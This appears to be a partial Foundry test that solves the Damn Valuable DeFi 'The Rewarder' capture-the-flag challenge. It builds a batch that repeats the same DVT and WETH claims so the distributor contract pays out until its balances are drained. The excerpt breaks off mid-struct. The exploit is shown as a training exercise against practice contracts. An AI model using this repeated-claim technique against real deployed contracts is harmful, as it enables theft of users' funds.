...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        ...
        // Create token an distribution with only one leave that is mine.
        DamnValuableToken myDamnValuableToken = new DamnValuableToken();
        myDamnValuableToken.approve(
            address(distributor),
            TOTAL_DVT_DISTRIBUTION_AMOUNT
        );
        bytes32 leaf = keccak256(
            abi.encodePacked(player, TOTAL_DVT_DISTRIBUTION_AMOUNT / 4)
        );
        ...
        distributor.createDistribution(
            IERC20(address(myDamnValuableToken)),
            root,
            TOTAL_DVT_DISTRIBUTION_AMOUNT
        );

        // Claim the reward in dvt
        IERC20[] memory tokensToClaim = new IERC20[](3);
        tokensToClaim[0] = IERC20(address(myDamnValuableToken));
        tokensToClaim[1] = IERC20(address(dvt));
        tokensToClaim[2] = IERC20(address(weth));
        ...
        uint256 dvtRepeatedClaims = 0;
        uint256 remainingDvt = distributor.getRemaining(address(dvt));

        while (remainingDvt >= PLAYER_DVT_CLAIM_AMOUNT) {
            dvtRepeatedClaims++;
            remainingDvt -= PLAYER_DVT_CLAIM_AMOUNT;
        }

        uint256 wethRepeatedClaims = 0;
        uint256 remainingWeth = distributor.getRemaining(address(weth));
        while (remainingWeth >= PLAYER_WETH_CLAIM_AMOUNT) {
            wethRepeatedClaims++;
            remainingWeth -= PLAYER_WETH_CLAIM_AMOUNT;
        }

        Claim[] memory claims = new Claim[](
            dvtRepeatedClaims + wethRepeatedClaims + 1
        );
        for (uint256 i = 0; i < dvtRepeatedClaims; i++) {
            claims[i] = dvtClaim;
        }
        for (
            uint256 i = dvtRepeatedClaims;
            i < wethRepeatedClaims + dvtRepeatedClaims;
            i++
        ) {
            claims[i] = wethClaim;
        }
        claims[dvtRepeatedClaims + wethRepeatedClaims] = Claim({
            batchNumber: 0,
            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT / 4,
            tokenIndex: 0,
